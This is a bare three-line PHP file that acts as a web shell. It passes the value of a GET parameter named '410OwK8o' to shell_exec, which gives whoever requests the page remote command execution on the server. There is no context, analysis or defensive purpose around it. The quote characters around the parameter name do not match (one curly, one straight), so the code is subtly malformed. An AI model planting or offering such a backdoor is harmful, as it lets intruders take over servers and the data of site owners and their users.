<?php
shell_exec($_GET[’410OwK8o']);
?>
